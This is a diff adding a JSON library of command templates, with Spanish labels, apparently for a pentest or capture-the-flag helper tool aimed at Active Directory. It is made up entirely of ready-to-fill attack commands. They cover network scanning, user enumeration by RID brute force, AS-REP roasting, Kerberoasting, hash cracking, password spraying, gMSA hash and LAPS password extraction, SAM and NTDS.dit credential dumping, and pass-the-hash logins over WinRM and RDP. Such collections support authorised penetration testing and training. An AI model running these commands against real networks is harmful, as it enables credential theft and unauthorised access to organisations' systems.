@@ -1,0 +1,266 @@
+{
+  "nmap_initial_scan": {
+    "label": "Nmap - Escaneo inicial de puertos",
+    "template": "sudo nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- {{IP}} -oG allPorts",
+    "auth": "password",
+    "group": "Nmap"
+  },
+  "extract_ports": {
+    "label": "ExtractPorts - Extraer puertos abiertos",
+    "template": "extractPorts allPorts",
+    "auth": "password",
+    "group": "Nmap"
+  },
+  "nmap_targeted": {
+    "label": "Nmap - Escaneo dirigido con scripts",
+    "template": "nmap -sC -sV -p{{PORTS}} {{IP}} -oN targeted",
+    "auth": "password",
+    "group": "Nmap"
+  },
+  "wfuzz_subdomains": {
+    "label": "Wfuzz - Enumerar subdominios",
+    "template": "wfuzz -c -z file,/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hc 404,400,401,301 -H \"Host: FUZZ.{{DOMAIN}}\" http://{{DOMAIN}}",
+    "auth": "password",
+    "group": "Web Enumeration"
+  },
+  "gobuster_dirs": {
+    "label": "Gobuster - Enumerar directorios/archivos",
+    "template": "gobuster dir -u http://{{DOMAIN}} -w /opt/SecLists/Discovery/Web-Content/common.txt -x php,html,txt,bak -t 50 -k",
+    "auth": "password",
+    "group": "Web Enumeration"
+  },
+  "nxc_smb_rid_brute_guest": {
+    "label": "NetExec - RID Brute con guest",
+    "template": "nxc smb {{IP}} -u guest -p '' --rid-brute 2>&1 | tee rid_brute.txt",
+    "auth": "password",
+    "group": "SMB Enumeration"
+  },
+  "extract_rid_users": {
+    "label": "Extraer usuarios de RID Brute",
+    "template": "cat rid_brute.txt | grep \"SidTypeUser\" | cut -d'\\' -f2 | cut -d' ' -f1 > usernames.txt",
+    "auth": "password",
+    "group": "User Enumeration"
+  },
+  "nxc_smb_generate_hosts": {
+    "label": "NetExec - Generar hosts file",
+    "template": "nxc smb {{IP}} -u 'guest' -p '' --generate-hosts-file hosts",
+    "auth": "password",
+    "group": "SMB Enumeration"
+  },
+  "nxc_ldap_asreproast_list": {
+    "label": "AS-REP Roasting (lista de usuarios)",
+    "template": "nxc ldap {{DC.DOMAIN}} -u usernames.txt -p '' --asreproast nxc-asreproasting.txt",
+    "auth": "kerberos",
+    "group": "AS-REP Roast"
+  },
+  "hashcat_asrep": {
+    "label": "Hashcat - Crackear AS-REP hash",
+    "template": "hashcat -a0 -m18200 nxc-asreproasting.txt /usr/share/wordlists/rockyou.txt",
+    "auth": "password",
+    "group": "Cracking"
+  },
+  "bloodhound_python_custom": {
+    "label": "BloodHound Python (con credenciales)",
+    "template": "bloodhound-python --zip -c All -d {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}' -dc {{DC.DOMAIN}} -ns {{IP}}",
+    "auth": "password",
+    "group": "BloodHound"
+  },
+  "kerbrute_passwordspray": {
+    "label": "Kerbrute - Password Spray",
+    "template": "kerbrute passwordspray -d '{{DOMAIN}}' --dc {{DC.DOMAIN}} usernames.txt '{{PASSWORD}}'",
+    "auth": "kerberos",
+    "group": "Password Spraying"
+  },
+  "ldapsearch_computers": {
+    "label": "LDAP - Enumerar cuentas de computadora",
+    "template": "ldapsearch -x -H ldap://{{IP}} -D \"{{USER_DN}}\" -w '{{PASSWORD}}' -b \"DC={{DOMAIN_DC_0}},DC={{DOMAIN_DC_1}}\" \"(objectClass=computer)\" sAMAccountName | grep sAMAccountName",
+    "auth": "password",
+    "group": "LDAP",
+    "subgroup": "Enumeración LDAP"
+  },
+  "impacket_get_tgt": {
+    "label": "Get TGT (Impacket)",
+    "template": "impacket-getTGT '{{DOMAIN}}/{{USER}}:{{PASSWORD}}' -dc-ip {{IP}}",
+    "auth": "password",
+    "group": "Get TGT"
+  },
+  "impacket_gettgt_computer": {
+    "label": "Get TGT (Cuenta de computadora)",
+    "template": "impacket-getTGT '{{DOMAIN}}/{{USER}}$:{{PASSWORD}}' -dc-ip {{IP}}",
+    "auth": "password",
+    "group": "Get TGT"
+  },
+  "export_krb5ccache": {
+    "label": "Exportar ticket (KRB5CCNAME)",
+    "template": "export KRB5CCNAME={{TICKET}}.ccache",
+    "auth": "password",
+    "group": "Kerberos"
+  },
+  "klist_check": {
+    "label": "Listar tickets activos",
+    "template": "klist",
+    "auth": "password",
+    "group": "Kerberos"
+  },
+  "kdestroy_all": {
+    "label": "Limpiar todos los tickets Kerberos",
+    "template": "kdestroy",
+    "auth": "password",
+    "group": "Kerberos"
+  },
+  "install_ntpdate": {
+    "label": "Instalar ntpdate (Kali/Debian/Ubuntu)",
+    "template": "sudo apt update && sudo apt install ntpsec-ntpdate -y",
+    "auth": "password",
+    "group": "Kerberos Time Sync"
+  },
+  "disable_timedatectl_ntp": {
+    "label": "Deshabilitar NTP automático",
+    "template": "sudo timedatectl set-ntp false",
+    "auth": "password",
+    "group": "Kerberos Time Sync"
+  },
+  "ntpdate_sync_dc_name": {
+    "label": "Sincronizar hora con DC (usando nombre del DC)",
+    "template": "sudo ntpdate -u {{DC.DOMAIN}}",
+    "auth": "password",
+    "group": "Kerberos Time Sync"
+  },
+  "ntpdate_sync_ip": {
+    "label": "Sincronizar hora con DC (usando IP)",
+    "template": "sudo ntpdate -u {{IP}}",
+    "auth": "password",
+    "group": "Kerberos Time Sync"
+  },
+  "check_time": {
+    "label": "Verificar hora actual",
+    "template": "date",
+    "auth": "password",
+    "group": "Kerberos Time Sync"
+  },
+  "enable_timedatectl_ntp": {
+    "label": "Rehabilitar NTP automático",
+    "template": "sudo timedatectl set-ntp true",
+    "auth": "password",
+    "group": "Kerberos Time Sync"
+  },
+  "nxc_ldap_gmsa_kcache": {
+    "label": "Extraer hashes de gMSA (usando ticket cache)",
+    "template": "nxc ldap {{DOMAIN}} -k --use-kcache --gmsa",
+    "auth": "kerberos",
+    "group": "Dumping Credentials",
+    "subgroup": "gMSA"
+  },
+  "nxc_smb_kcache_test": {
+    "label": "Probar autenticación con ticket cache",
+    "template": "nxc smb {{DOMAIN}} -k --use-kcache",
+    "auth": "kerberos",
+    "group": "Kerberos",
+    "subgroup": "Test Auth"
+  },
+  "nxc_ldap_kcache_enum": {
+    "label": "Enumerar LDAP con ticket cache",
+    "template": "nxc ldap {{DOMAIN}} -k --use-kcache --users",
+    "auth": "kerberos",
+    "group": "LDAP",
+    "subgroup": "Enumeración LDAP"
+  },
+  "evil_winrm_hash": {
+    "label": "Conectar por WinRM (Pass-the-Hash)",
+    "template": "evil-winrm -i {{IP}} -u '{{USER}}' -H '{{HASH}}'",
+    "auth": "pth",
+    "group": "WinRM"
+  },
+  "evil_winrm": {
+    "label": "Conectar por WinRM (usuario/contraseña)",
+    "template": "evil-winrm -i {{IP}} -u '{{USER}}' -p '{{PASSWORD}}'",
+    "auth": "password",
+    "group": "WinRM"
+  },
+  "nxc_ldap_validate": {
+    "label": "Validate Credentials (LDAP)",
+    "template": "nxc ldap {{IP}} -u '{{USER}}' -p '{{PASSWORD}}'",
+    "auth": "password",
+    "group": "LDAP"
+  },
+  "nxc_smb_spider_all": {
+    "label": "Spider SMB All Shares",
+    "template": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' -M spider_plus",
+    "auth": "password",
+    "group": "SMB Enumeration"
+  },
+  "nxc_smb_full_enum": {
+    "label": "Full SMB Enumeration",
+    "template": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol",
+    "auth": "password",
+    "group": "SMB Enumeration"
+  },
+  "nxc_smb_enum_users": {
+    "label": "Enum SMB Users",
+    "template": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --users | tail -n +4 | awk '{print $5}' | grep -v '*' > users.txt",
+    "auth": "password",
+    "group": "User Enumeration"
+  },
+  "nxc_ldap_enum_users": {
+    "label": "Enum LDAP Users",
+    "template": "nxc ldap {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --users | tail -n +5 | awk '{print $5}' | grep -v '*' > users.txt",
+    "auth": "password",
+    "group": "User Enumeration"
+  },
+  "nxc_smb_rid_brute": {
+    "label": "RID Brute",
+    "template": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --rid-brute | tail -n +3 | grep SidTypeUser | awk '{print $6}' | awk '{print $NF}' FS='\\\\' > users.txt",
+    "auth": "password",
+    "group": "User Enumeration"
+  },
+  "nxc_ldap_kerberoasting": {
+    "label": "Kerberoasting",
+    "template": "nxc ldap {{DC.DOMAIN}} -u '{{USER}}' -p '{{PASSWORD}}' --kerberoasting hashes.txt",
+    "auth": "password",
+    "group": "Kerberoasting"
+  },
+  "nxc_ldap_bloodhound": {
+    "label": "BloodHound (NetExec)",
+    "template": "nxc ldap {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --bloodhound --collection All --dns-server {{IP}}",
+    "auth": "password",
+    "group": "BloodHound"
+  },
+  "nxc_smb_sam": {
+    "label": "Dumping SAM",
+    "template": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --sam",
+    "auth": "password",
+    "group": "Dumping Credentials"
+  },
+  "nxc_smb_ntds": {
+    "label": "Dumping NTDS.dit",
+    "template": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --ntds vv",
+    "auth": "password",
+    "group": "Dumping Credentials"
+  },
+  "xfreerdp": {
+    "label": "Connect via xfreeRDP",
+    "template": "xfreerdp /v:'{{IP}}' /u:'{{USER}}' /p:'{{PASSWORD}}' /dynamic-resolution",
+    "auth": "password",
+    "group": "RDP"
+  },
+  "xfreerdp_pth": {
+    "label": "Connect via xfreeRDP (Pass-the-Hash)",
+    "template": "xfreerdp /v:'{{IP}}' /u:'{{USER}}' /pth:'{{HASH}}' /dynamic-resolution",
+    "auth": "pth",
+    "group": "RDP"
+  },
+  "ldapsearch_base": {
+    "label": "LDAP - Obtener base DN",
+    "template": "ldapsearch -x -H ldap://{{IP}} -s base | grep defaultNamingContext",
+    "auth": "password",
+    "group": "LDAP",
+    "subgroup": "Enumeración LDAP"
+  },
+  "ldapsearch_laps": {
+    "label": "LDAP - Obtener LAPS",
+    "template": "ldapsearch -x -H ldap://{{IP}} -D \"{{USER_DN}}\" -w '{{PASSWORD}}' -b \"DC={{DOMAIN_DC_0}},DC={{DOMAIN_DC_1}}\" '(objectClass=computer)' ms-MCS-AdmPwd",
+    "auth": "password",
+    "group": "LDAP",
+    "subgroup": "Enumeración LDAP"
+  }
+}
